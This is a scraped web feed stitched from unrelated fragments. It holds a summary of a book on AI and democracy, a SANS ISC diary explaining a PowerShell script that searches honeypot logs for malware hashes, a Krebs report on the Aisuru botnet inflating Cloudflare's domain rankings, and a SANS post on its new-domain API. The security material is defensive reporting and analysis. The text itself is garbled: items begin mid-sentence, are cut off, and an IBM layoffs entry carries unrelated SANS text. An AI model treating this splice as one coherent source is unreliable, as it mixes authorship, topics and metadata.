&lt;p&gt;Below, co-authors Bruce Schneier and Nathan E. Sanders share five key insights from their new book, &lt;em&gt;Rewiring Democracy: How AI Will Transform Our Politics, Government, and Citizenship&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;What&amp;#8217;s the big idea?&lt;/h3&gt;
&lt;p&gt;AI can be used both for and against the public interest within democracies. It is already being used in the governing of nations around the world, and there is no escaping its continued use in the future by leaders, policy makers, and legal enforcers. How we wire AI into democracy today will determine if it becomes a tool of oppression or empowerment.&lt;/p&gt;
&lt;h3&gt;1. AI&amp;#8217;s global democratic impact is already profound.&lt;/h3&gt;
&lt;p&gt;It&amp;#8217;s been just a few years since ChatGPT stormed into view and AI&amp;#8217;s influence has already permeated every democratic process in governments around the world:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;In 2022, an artist collective in Denmark founded the world&amp;#8217;s first political party committed to an AI-generated policy platform.&lt;/li&gt;
&lt;li&gt;Also in 2022, South Korean politicians running for the presidency were the first to use AI avatars to communicate with voters en masse.&lt;/li&gt;
&lt;li&gt;In 2023, a Brazilian municipal legislator passed the first enacted law written by AI.&lt;/li&gt;
&lt;li&gt;In 2024, a U.S. federal court judge started using AI to interpret the plain meaning of words in U.S. law.&lt;/li&gt;
&lt;li&gt;Also in 2024, the Biden administration disclosed more than two thousand discrete use cases for AI across the agencies of the U.S. federal government.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The examples illustrate the diverse uses of AI across citizenship, politics, legislation, the judiciary, and executive administration.&lt;/p&gt;
&lt;p&gt;Not all of these uses will create lasting change. Some of these will be one-offs. Some are inherently small in scale. Some were publicity stunts. But each use case speaks to a shifting balance of supply and demand that AI will increasingly mediate.&lt;/p&gt;
&lt;p&gt;Legislators need assistance drafting bills and have limited staff resources, especially at the local and state level. Historically, they have looked to lobbyists and interest groups for help. Increasingly, it&amp;#8217;s just as easy for them to use an AI tool.&lt;/p&gt;
&lt;h3&gt;2. The first places AI will be used are where there is the least public oversight.&lt;/h3&gt;
&lt;p&gt;Many of the use cases for AI in governance and politics have vocal objectors. Some make us uncomfortable, especially in the hands of authoritarians or ideological extremists.&lt;/p&gt;
&lt;p&gt;In some cases, politics will be a regulating force to prevent dangerous uses of AI. Massachusetts has banned the use of AI face recognition in law enforcement because of real concerns voiced by the public about their tendency to encode systems of racial bias.&lt;/p&gt;
&lt;p&gt;Some of the uses we think might be most impactful are unlikely to be adopted fast because of legitimate concern about their potential to make mistakes, introduce bias, or subvert human agency. AIs could be assistive tools for citizens, acting as their voting proxies to help us weigh in on larger numbers of more complex ballot initiatives, but we know that many will object to anything that verges on AIs being given a vote.&lt;/p&gt;
&lt;p&gt;But AI will continue to be rapidly adopted in some aspects of democracy, regardless of how the public feels. People within democracies, even those in government jobs, often have great independence. They don&amp;#8217;t have to ask anyone if it&amp;#8217;s ok to use AI, and they will use it if they see that it benefits them. The Brazilian city councilor who used AI to draft a bill did not ask for anyone&amp;#8217;s permission. The U.S. federal judge who used AI to help him interpret law did not have to check with anyone first. And the Trump administration seems to be using AI for everything from drafting tariff policies to writing public health reports&amp;#8212;with some obvious drawbacks.&lt;/p&gt;
&lt;p&gt;It&amp;#8217;s likely that even the thousands of disclosed AI uses in government are only the tip of the iceberg. These are just the applications that governments have seen fit to share; the ones they think are the best vetted, most likely to persist, or maybe the least controversial to disclose.&lt;/p&gt;
&lt;h3&gt;3. Elites and authoritarians will use AI to concentrate power.&lt;/h3&gt;
&lt;p&gt;Many Westerners point to China as a cautionary tale of how AI could empower autocracy, but the reality is that AI provides structural advantages to entrenched power in democratic governments, too. The nature of automation is that it gives those at the top of a power structure more control over the actions taken at its lower levels.&lt;/p&gt;
&lt;p&gt;It&amp;#8217;s famously hard for newly elected leaders to exert their will over the many layers of human bureaucracies. The civil service is large, unwieldy, and messy. But it&amp;#8217;s trivial for an executive to change the parameters and instructions of an AI model being used to automate the systems of government.&lt;/p&gt;
&lt;p&gt;The dynamic of AI effectuating concentration of power extends beyond government agencies. Over the past five years, Ohio has undertaken a project to do a wholesale revision of its administrative code using AI. The leaders of that project framed it in terms of efficiency and good governance: deleting millions of words of outdated, unnecessary, or redundant language. The same technology could be applied to advance more ideological ends, like purging all statutory language that places burdens on business, neglects to hold businesses accountable, protects some class of people, or fails to protect others.&lt;/p&gt;
&lt;p&gt;Whether you like or despise automating the enactment of those policies will depend on whether you stand with or are opposed to those in power, and that&amp;#8217;s the point. AI gives any faction with power the potential to exert more control over the levers of government.&lt;/p&gt;
&lt;h3&gt;4. Organizers will find ways to use AI to distribute power instead.&lt;/h3&gt;
&lt;p&gt;We don&amp;#8217;t have to resign ourselves to a world where AI makes the rich richer and the elite more powerful. This is a technology that can also be wielded by outsiders to help level the playing field.&lt;/p&gt;
&lt;p&gt;In politics, AI gives upstart and local candidates access to skills and the ability to do work on a scale that used to only be available to well-funded campaigns. In the 2024 cycle, Congressional candidates running against incumbents like Glenn Cook in Georgia and Shamaine Daniels in Pennsylvania used AI to help themselves be everywhere all at once. They used AI to make personalized robocalls to voters, write frequent blog posts, and even generate podcasts in the candidate&amp;#8217;s voice. In Japan, a candidate for Governor of Tokyo used an AI avatar to respond to more than eight thousand online questions from voters.&lt;/p&gt;
&lt;p&gt;Outside of public politics, labor organizers are also leveraging AI to build power. The Worker&amp;#8217;s Lab is a U.S. nonprofit developing assistive technologies for labor unions, like AI-enabled apps that help service workers report workplace safety violations. The 2023 Writers&amp;#8217; Guild of America strike serves as a blueprint for organizers. They won concessions from Hollywood studios that protect their members against being displaced by AI while also winning them guarantees for being able to use AI as assistive tools to their own benefit.&lt;/p&gt;
&lt;h3&gt;5. The ultimate democratic impact of AI depends on us.&lt;/h3&gt;
&lt;p&gt;If you are excited about AI and see the potential for it to make life, and maybe even democracy, better around the world, recognize that there are a lot of people who don&amp;#8217;t feel the same way.&lt;/p&gt;
&lt;p&gt;If you are disturbed about the ways you see AI being used and worried about the future that leads to, recognize that the trajectory we&amp;#8217;re on now is not the only one available.&lt;/p&gt;
&lt;p&gt;The technology of AI itself does not pose an inherent threat to citizens, workers, and the public interest. Like other democratic technologies&amp;#8212;voting processes, legislative districts, judicial review&amp;#8212;its impacts will depend on how it&amp;#8217;s developed, who controls it, and how it&amp;#8217;s used.&lt;/p&gt;
&lt;p&gt;Constituents of democracies should do four things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Reform&lt;/strong&gt; the technology ecosystem to be more trustworthy, so that AI is developed with more transparency, more guardrails around exploitative use of data, and public oversight.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Resist&lt;/strong&gt; inappropriate uses of AI in government and politics, like facial recognition technologies that automate surveillance and encode inequity.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Responsibly use&lt;/strong&gt; AI in government where it can help improve outcomes, like making government more accessible to people through translation and speeding up administrative decision processes.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Renovate&lt;/strong&gt; the systems of government vulnerable to the disruptive potential of AI&amp;#8217;s superhuman capabilities, like political advertising rules that never anticipated deepfakes.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These four Rs are how we can rewire our democracy in a way that applies AI to truly benefit the public interest.&lt;/p&gt;

&lt;p&gt;My last college credit on my way to earning a bachelor's degree was an internship opportunity at the Internet Storm Center. A great opportunity, but one that required the care and feeding of a honeypot. The day it arrived I plugged the freshly imaged honeypot into my home router and happily went about my day. I didn&amp;rsquo;t think too much about it until the first attack observation was due. You see, I travel often, but my honeypot does not. Furthermore, the administrative side of the honeypot was only accessible through the internal network. I wasn&amp;rsquo;t about to implement a whole remote solution just to get access while on the road. Instead, I followed some very good advice. I started downloading regular backups of the honeypot logs on a Windows laptop I frequently had with me.&lt;/p&gt;

&lt;p&gt;The internship program encouraged us to at least initially review our honeypot logs with command line utilities, such as jq and all its flexibility with filtering. Combined with other standard Unix-like operating system tools, such as wc (word count), less, head, and cut, it was possible to extract exactly what I was looking for. I initially tried using more graphical tools but found I enjoy &amp;quot;living&amp;quot; in the command line better. When I first start looking at logs, I was not always sure of what I&amp;rsquo;m looking for. Command line tools allow me to quickly look for outliers in the data. I can see what sticks out by negating everything that looks the same.&amp;nbsp;&lt;/p&gt;

&lt;p&gt;So, what&amp;rsquo;s the trouble? None of these tools were available on my Windows laptop. Admittedly, most of what I mention above are available for Windows, but my ability to install software was restricted on this machine, and I knew that native alternatives existed. At the time I had several directories of JSON logs, and a long list of malware hash values corresponding to an attack I was interested in understanding better. Here&amp;rsquo;s how a few lines of PowerShell can transform scattered honeypot logs into a clear picture of what really happened.&lt;/p&gt;

&lt;p&gt;First, let&amp;rsquo;s start with the script in two parts. Here&amp;rsquo;s the PowerShell array containing malware hash values:&lt;/p&gt;

&lt;p&gt;&lt;span style="font-family: Lucida Sans Unicode,Lucida Grande,sans-serif;"&gt;$hashes = @(&lt;br /&gt;
&amp;quot;00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f&amp;quot;,&lt;br /&gt;
&amp;quot;0131d2f87f9bc151fb2701a570585ed4db636440392a357a54b8b29f2ba842da&amp;quot;,&lt;br /&gt;
&amp;quot;01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b&amp;quot;,&lt;br /&gt;
&amp;quot;0291de841b47fe19557c2c999ae131cd571eb61782a109b9ef5b4a4944b6e76d&amp;quot;,&lt;br /&gt;
&amp;quot;02a95dae81a8dd3545ce370f8c0ee300beff428b959bd7cec2b35e8d1cd7024e&amp;quot;,&lt;br /&gt;
&amp;quot;062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a&amp;quot;,&lt;br /&gt;
&amp;quot;0be1c3511c67ecb8421d0be951e858bb3169ac598d068bae3bc8451e883946cc&amp;quot;,&lt;br /&gt;
&amp;quot;0cbd5117413a0cab8b22f567b5ec5ec63c81b2f0f58e8e87146ecf7aace2ec71&amp;quot;,&lt;br /&gt;
&amp;quot;0d2d316bc4937a2608e8d9a3030a545973e739805c3449b466984b27598fcdec&amp;quot;,&lt;br /&gt;
&amp;quot;0d58ee0cd46d5908f31ba415f2e006c1bb0215b0ecdc27dd2b3afa74799e17bd&amp;quot;&lt;br /&gt;
)&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;The $hashes = @( ) between quoted, comma-separated values, establishes a PowerShell array of strings which represents the hashes we want to search for. Now let&amp;rsquo;s look at how we put this array to use.&lt;/p&gt;

&lt;p&gt;&lt;span style="font-family: Lucida Sans Unicode,Lucida Grande,sans-serif;"&gt;Get-ChildItem -Path &amp;quot;C:\Users\Dave\Logs&amp;quot; -Filter 'cowrie.json.*' -Recurse |&lt;br /&gt;
ForEach-Object {&lt;br /&gt;
&amp;nbsp; &amp;nbsp; $jsonContent = Get-Content $_.FullName&lt;br /&gt;
&amp;nbsp; &amp;nbsp; write-output $_.FullName&lt;br /&gt;
&amp;nbsp; &amp;nbsp; foreach ($hash in $hashes) {&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $searchResults = $null&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $searchResults = $jsonContent | Select-String $hash&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if (![string]::IsNullOrEmpty($searchResults)) {&amp;nbsp;&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; write-output $searchResults&amp;nbsp;&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;br /&gt;
&amp;nbsp; &amp;nbsp; }&lt;br /&gt;
}&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Let's walk through the execution of the script. The first statement, &lt;span style="font-family: Courier New,Courier,monospace;"&gt;Get-ChildItem&lt;/span&gt;, recurses every folder in the specified path (&lt;span style="font-family: Courier New,Courier,monospace;"&gt;C:\Users\Dave\Logs\&lt;/span&gt;) and passes along all filenames that match the filter argument. Each filename is passed through the &amp;quot;pipe&amp;quot; (|) directly into the first ForEach-Object statement. You can see what&amp;rsquo;s passed by observing the output of the &lt;span style="font-family: Courier New,Courier,monospace;"&gt;write-output $_.FullName&lt;/span&gt; line. The &lt;span style="font-family: Courier New,Courier,monospace;"&gt;$_&lt;/span&gt; is a variable designation which represents whatever is passed through the pipe. In this case, we know what kind of data to expect (a filename) so we can access it&amp;rsquo;s attribute, &amp;quot;FullName&amp;quot;. This tells us the specific JSON log file currently being searched.&lt;/p&gt;

&lt;p&gt;Now let&amp;rsquo;s get into the meat of the script. The main body of the script contains two nested For-Loops. The outer loop begins with the first &amp;quot;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;ForEach-Object&lt;/span&gt;&amp;quot; block of code. The inner loop is described by the lowercase &amp;quot;foreach&amp;quot; block. We already know the name of the JSON log we&amp;rsquo;ll be searching next, so the next line, &lt;span style="font-family: Courier New,Courier,monospace;"&gt;$jsonContent = Get-Content $_.FullName&lt;/span&gt; sets that up to happen. It takes the content of the first filename passed to &lt;strong&gt;$_&lt;/strong&gt; though the pipe, reads the contents of that filename, and stores the text in a variable named &lt;span style="font-family: Courier New,Courier,monospace;"&gt;$jsonContent&lt;/span&gt;. Now we&amp;rsquo;ve got our first log to search, all we have to do is run through the list of hash values to search for! This takes us to the point of the script where we reach the inner-loop. The foreach inner-loop is similar to the outer loop with the exception of how it processes data. The statement, &lt;span style="font-family: Courier New,Courier,monospace;"&gt;foreach ($hash in $hashes)&lt;/span&gt; takes each hash value found in the &lt;span style="font-family: Courier New,Courier,monospace;"&gt;$hashes&lt;/span&gt; array and puts a copy of it into $hash before executing the code block it contains.&amp;nbsp;&lt;/p&gt;

&lt;p&gt;When the inner-loop runs it does three things. First, &lt;span style="font-family: Courier New,Courier,monospace;"&gt;$searchResults = $null&lt;/span&gt; empties the value of the $searchResults variable. This is also called &amp;quot;initializing&amp;quot; the variable, and it&amp;rsquo;s a good practice whenever you're working with loops that re-use the same variable names. Second, with the variable clear and ready to accept new values, the next line accomplishes a few things.&lt;/p&gt;

&lt;p&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;span style="font-family: Lucida Sans Unicode,Lucida Grande,sans-serif;"&gt; $searchResults = $jsonContent | Select-String $hash&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Starting to the right of the equals sign, we&amp;rsquo;re passing the JSON log text&lt;span style="font-family: Courier New,Courier,monospace;"&gt; $jsonContent&lt;/span&gt; into the command &amp;quot;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;Select-String&lt;/span&gt;&amp;quot; while also passing &lt;span style="font-family: Courier New,Courier,monospace;"&gt;Select-String&lt;/span&gt; a single argument, &lt;span style="font-family: Courier New,Courier,monospace;"&gt;$hash&lt;/span&gt;.&amp;nbsp; Remember earlier when the lowercase foreach loop started, it takes each value found in the $hashes array and (one at a time) places their values into $hash before executing the block of code below it. So we&amp;rsquo;re passing the text in &lt;span style="font-family: Courier New,Courier,monospace;"&gt;$jsonContent&lt;/span&gt; through another pipe to &lt;span style="font-family: Courier New,Courier,monospace;"&gt;Select-String&lt;/span&gt;, which takes that text and searches for the value &lt;span style="font-family: Courier New,Courier,monospace;"&gt;$hash&lt;/span&gt; within the contents of &lt;span style="font-family: Courier New,Courier,monospace;"&gt;$jsonContent&lt;/span&gt;. The results of &lt;span style="font-family: Courier New,Courier,monospace;"&gt;Search-String&lt;/span&gt; are then stored in the variable named &lt;span style="font-family: Courier New,Courier,monospace;"&gt;$searchResults&lt;/span&gt;.&lt;/p&gt;

&lt;p&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;span style="font-family: Lucida Sans Unicode,Lucida Grande,sans-serif;"&gt; if (![string]::IsNullOrEmpty($searchResults)) {&amp;nbsp;&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; write-output $searchResults&amp;nbsp;&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Third and finally, we have an if statement to determine whether the prior &lt;span style="font-family: Courier New,Courier,monospace;"&gt;Select-String&lt;/span&gt; produced any results. If it found the $hash value it was looking for, the &lt;span style="font-family: Courier New,Courier,monospace;"&gt;$searchResults&lt;/span&gt; variable will contain data. If not, it will remain empty (&lt;span style="font-family: Courier New,Courier,monospace;"&gt;$null&lt;/span&gt;). The if statement makes that determination and prints the $searchResults it found. Note the ! at the beginning of the statement which tells it to evaluate as, &amp;quot;if not empty.&amp;quot;&lt;/p&gt;

&lt;p&gt;While compact in size, this script introduces the PowerShell newcomer to a variety of useful functions: traversing files and folders, retrieving text, searching text, and nested loops are all sophisticated techniques. If you save this script, you can adapt it in many ways whenever a quick solution is needed. Understanding the tools that are available to us in any environment and having practice adapting those tools to our circumstances makes us all better cybersecurity professionals.&lt;/p&gt;

Cloudflare responded by redacting Aisuru domain names from their top websites list. The chief executive at Cloudflare says Aisuru&amp;#8217;s overlords are using the botnet to boost their malicious domain rankings, while simultaneously attacking the company&amp;#8217;s domain name system (DNS) service.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72541" style="width: 757px;"&gt;&lt;img alt="" class=" wp-image-72541" height="529" src="https://krebsonsecurity.com/wp-content/uploads/2025/11/CFRadar-Aisuru-redacted.png" width="747" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72541"&gt;The #1 and #3 positions in this chart are Aisuru botnet controllers with their full domain names redacted. Source: radar.cloudflare.com.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Aisuru is a rapidly growing botnet comprising hundreds of thousands of hacked Internet of Things (IoT) devices, such as poorly secured Internet routers and security cameras. The botnet has &lt;a href="https://krebsonsecurity.com/2025/10/aisuru-botnet-shifts-from-ddos-to-residential-proxies/" rel="noopener" target="_blank"&gt;increased in size and firepower significantly since its debut in 2024&lt;/a&gt;, demonstrating the ability &lt;a href="https://krebsonsecurity.com/2025/10/ddos-botnet-aisuru-blankets-us-isps-in-record-ddos/" rel="noopener" target="_blank"&gt;to launch record distributed denial-of-service (DDoS) attacks&lt;/a&gt; nearing 30 terabits of data per second.&lt;/p&gt;
&lt;p&gt;Until recently, Aisuru&amp;#8217;s malicious code instructed all infected systems to use DNS servers from Google &amp;#8212; specifically, the servers at 8.8.8.8. But in early October, Aisuru switched to invoking Cloudflare&amp;#8217;s main DNS server &amp;#8212; 1.1.1.1 &amp;#8212; and over the past week domains used by Aisuru to control infected systems started populating Cloudflare&amp;#8217;s top domain rankings.&lt;/p&gt;
&lt;p&gt;As screenshots of Aisuru domains claiming two of the Top 10 positions ping-ponged across social media, many feared this was yet another sign that an already untamable botnet was running completely amok. One Aisuru botnet domain that sat prominently for days at #1 on the list was someone&amp;#8217;s street address in Massachusetts followed by &amp;#8220;.com&amp;#8221;. Other Aisuru domains mimicked those belonging to major cloud providers.&lt;/p&gt;
&lt;p&gt;Cloudflare tried to address these security, brand confusion and privacy concerns by partially redacting the malicious domains, and adding a warning at the top of its rankings:&lt;/p&gt;
&lt;p&gt;&amp;#8220;Note that the top 100 domains and trending domains lists include domains with organic activity as well as domains with emerging malicious behavior.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-72551" height="466" src="https://krebsonsecurity.com/wp-content/uploads/2025/11/cfradar-warning.png" width="675" /&gt;&lt;/p&gt;
&lt;p&gt;Cloudflare CEO &lt;strong&gt;Matthew Prince&lt;/strong&gt; told KrebsOnSecurity the company&amp;#8217;s domain ranking system is fairly simplistic, and that it merely measures the volume of DNS queries to 1.1.1.1.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The attacker is just generating a ton of requests, maybe to influence the ranking but also to attack our DNS service,&amp;#8221; Prince said, adding that Cloudflare has heard reports of other large public DNS services seeing similar uptick in attacks. &amp;#8220;We’re fixing the ranking to make it smarter. And, in the meantime, redacting any sites we classify as malware.&amp;#8221;&lt;span id="more-72528"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Renee Burton&lt;/strong&gt;, vice president of threat intel at the DNS security firm &lt;strong&gt;Infoblox&lt;/strong&gt;, said many people erroneously assumed that the skewed Cloudflare domain rankings meant there were more bot-infected devices than there were regular devices querying sites like Google and Apple and Microsoft.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Cloudflare&amp;#8217;s documentation is clear &amp;#8212; they know that when it comes to ranking domains you have to make choices on how to normalize things,&amp;#8221; Burton &lt;a href="https://www.linkedin.com/feed/update/urn:li:activity:7391657470152228864/" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt; on &lt;strong&gt;LinkedIn&lt;/strong&gt;. &amp;#8220;There are many aspects that are simply out of your control. Why is it hard? Because reasons. TTL values, caching, prefetching, architecture, load balancing. Things that have shared control between the domain owner and everything in between.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Alex Greenland&lt;/strong&gt; is CEO of the anti-phishing and security firm &lt;strong&gt;Epi&lt;/strong&gt;. Greenland said he understands the technical reason why Aisuru botnet domains are showing up in Cloudflare&amp;#8217;s rankings (those rankings are based on DNS query volume, not actual web visits). But he said they&amp;#8217;re still not meant to be there.&lt;/p&gt;
&lt;p&gt;&amp;#8220;It&amp;#8217;s a failure on Cloudflare&amp;#8217;s part, and reveals a compromise of the trust and integrity of their rankings,&amp;#8221; he said.&lt;/p&gt;
&lt;p&gt;Greenland said Cloudflare planned for its Domain Rankings to list the most popular domains as used by human users, and it was never meant to be a raw calculation of query frequency or traffic volume going through their 1.1.1.1 DNS resolver.&lt;/p&gt;
&lt;p&gt;&amp;#8220;They spelled out how their popularity algorithm is designed to reflect real human use and exclude automated traffic (they said they&amp;#8217;re good at this),&amp;#8221; Greenland &lt;a href="https://www.linkedin.com/posts/activity-7390787635759173632-pycT?utm_source=share&amp;amp;utm_medium=member_desktop&amp;amp;rcm=ACoAAAAliaMB3BQO-WOS-eUh-XU4HAd5h8pTzkI" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt; on LinkedIn. &amp;#8220;So something has evidently gone wrong internally. We should have two rankings: one representing trust and real human use, and another derived from raw DNS volume.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Why might it be a good idea to wholly separate malicious domains from the list? Greenland notes that Cloudflare Domain Rankings see widespread use for trust and safety determination, by browsers, DNS resolvers, safe browsing APIs and things like &lt;a href="https://tranco-list.eu/" rel="noopener" target="_blank"&gt;TRANCO&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&amp;#8220;TRANCO is a respected open source list of the top million domains, and Cloudflare Radar is one of their five data providers,&amp;#8221; he continued. &amp;#8220;So there can be serious knock-on effects when a malicious domain features in Cloudflare&amp;#8217;s top 10/100/1000/million. To many people and systems, the top 10 and 100 are naively considered safe and trusted, even though algorithmically-defined top-N lists will always be somewhat crude.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Over this past week, Cloudflare started redacting portions of the malicious Aisuru domains from its Top Domains list, leaving only their domain suffix visible. Sometime in the past 24 hours, Cloudflare appears to have begun hiding the malicious Aisuru domains entirely from the web version of that list. However, downloading a spreadsheet of the current Top 200 domains from Cloudflare Radar shows an Aisuru domain still at the very top.&lt;/p&gt;
&lt;p&gt;According to Cloudflare&amp;#8217;s website, the majority of DNS queries to the top Aisuru domains &amp;#8212; nearly 52 percent &amp;#8212; originated from the United States. This tracks with &lt;a href="https://krebsonsecurity.com/2025/10/ddos-botnet-aisuru-blankets-us-isps-in-record-ddos/" rel="noopener" target="_blank"&gt;my reporting from early October&lt;/a&gt;, which found Aisuru was drawing most of its firepower from IoT devices hosted on U.S. Internet providers like &lt;strong&gt;AT&amp;amp;T&lt;/strong&gt;, &lt;strong&gt;Comcast&lt;/strong&gt; and &lt;strong&gt;Verizon&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Experts tracking Aisuru say the botnet relies on well more than a hundred control servers, and that for the moment at least most of those domains are registered in the .su top-level domain (TLD). Dot-su is the TLD assigned to the former Soviet Union (.su&amp;#8217;s &lt;a href="https://en.wikipedia.org/wiki/.su" rel="noopener" target="_blank"&gt;Wikipedia page&lt;/a&gt; says the TLD was created just 15 months before the fall of the Berlin wall).&lt;/p&gt;
&lt;p&gt;A &lt;a href="https://blog.cloudflare.com/introducing-tld-insights-on-cloudflare-radar/" rel="noopener" target="_blank"&gt;Cloudflare blog post from October 27&lt;/a&gt; found that .su had the highest &amp;#8220;DNS magnitude&amp;#8221; of any TLD, referring to a metric estimating the popularity of a TLD based on the number of unique networks querying Cloudflare&amp;#8217;s 1.1.1.1 resolver. The report concluded that the top .su hostnames were associated with a popular online world-building game, and that more than half of the queries for that TLD came from the United States, Brazil and Germany [it&amp;#8217;s worth noting that servers for the world-building game &lt;strong&gt;Minecraft&lt;/strong&gt; were &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/10/tcpshield-aisuru.png" rel="noopener" target="_blank"&gt;some of Aisuru&amp;#8217;s most frequent targets&lt;/a&gt;].&lt;/p&gt;
&lt;p&gt;A simple and crude way to detect Aisuru bot activity on a network may be to set an alert on any systems attempting to contact domains ending in .su. This TLD is frequently abused for cybercrime and by cybercrime forums and services, and blocking access to it entirely is unlikely to raise any legitimate complaints.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=72528</guid><category>A Little Sunshine</category><category>DDoS-for-Hire</category><category>Internet of Things (IoT)</category><category>Web Fraud 2.0</category><category>Aisuru</category><category>Alex Greenland</category><category>Amazon</category><category>CloudFlare</category><category>Cloudflare Radar</category><category>Epi</category><category>Google Apple</category><category>Infoblox</category><category>Matthew Prince</category><category>microsoft</category><category>Renee Burton</category></item><item><title>ISC Stormcast For Thursday, November 6th, 2025 https://isc.sans.edu/podcastdetail/9688, (Thu, Nov 6th)</title><link>https://isc.sans.edu/diary/rss/32456</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32456</guid></item><item><title>IBM Confirms Layoffs Impacting Up to 5,000 Workers as It Shifts Focus to AI</title><link>https://www.techrepublic.com/article/news-ibm-layoffs-november-2025/</link><description>&lt;p&gt;IBM is cutting thousands of jobs as it pivots toward AI and software.

This list is offered via our API (&lt;a href="https://isc.sans.edu/api"&gt;https://isc.sans.edu/api&lt;/a&gt;). However, the size of the list has been causing issues, resulting in a "cut-off" list being returned. To resolve this issue, I updated the API call. It is sort of backward compatible, but it will not allow you to retrieve the full list. Additionally, we offer a simple "static file" containing the complete list. This file should be used whenever possible instead of the API.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;For several years, we have offered a &amp;quot;new domain&amp;quot; list of recently registered (or, more accurately, recently discovered) domains. This list is offered via our API (&lt;a href="https://isc.sans.edu/api"&gt;https://isc.sans.edu/api&lt;/a&gt;).

It is sort of backward compatible, but it will not allow you to retrieve the full list. Additionally, we offer a simple &amp;quot;static file&amp;quot; containing the complete list. This file should be used whenever possible instead of the API.&lt;/p&gt;

&lt;p&gt;To retrieve the full list, updated hourly, use:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://isc.sans.edu/feeds/domaindata.json.gz"&gt;https://isc.sans.edu/feeds/domaindata.json.gz&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We also offer&amp;nbsp;past versions of this list for the last few days. For example:&amp;nbsp;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://isc.sans.edu/feeds/domaindata.2025-11-01.json.gz"&gt;https://isc.sans.edu/feeds/domaindata.2025-11-01.json.gz&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I have not decided yet how long to keep these historic lists. The same data can be retrieved via the API request below. Likely, I will keep the last week as a &amp;quot;precompiled&amp;quot; list.&lt;/p&gt;

&lt;p&gt;For the API, you may now retrieve partial copies of the list. The full URL for the API is:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;https://isc.sans.edu/api/recentdomains/[date]/[searchstring]/[start]/[count]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;For example:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;https://isc.sans.edu/api/recentdomains/2025-11-05/sans/0/1000?json&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Will return&amp;nbsp;all domains found today (November 5th) that contain the string &amp;quot;sans&amp;quot;. The first 1,000 matches are returned.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;date&lt;/strong&gt;: The date in &amp;quot;YYYY-MM-DD&amp;quot; format. The word &amp;quot;today&amp;quot; can be used instead of the current date if you only want the most recent data. The default is &amp;quot;today&amp;quot;.&lt;br /&gt;
&lt;strong&gt;searchstring&lt;/strong&gt;: only domains containing this string will be returned. Use &amp;quot;+&amp;quot; as a wildcard to get all domains. This defaults to returning any domain.&lt;br /&gt;
&lt;strong&gt;start:&amp;nbsp;&lt;/strong&gt;The number of the record to start with (defaults to 0)&lt;br /&gt;
&lt;strong&gt;count:&lt;/strong&gt;&amp;nbsp;How many records to return (defaults to all records)&lt;/p&gt;

&lt;p&gt;In return, you will receive XML by default, but you may easily switch to other formats by adding, for example, &amp;quot;?json&amp;quot; to the end of the URL, which will return JSON.&lt;/p&gt;

&lt;p&gt;The data returned remains the same:&lt;/p&gt;

&lt;blockquote&gt;
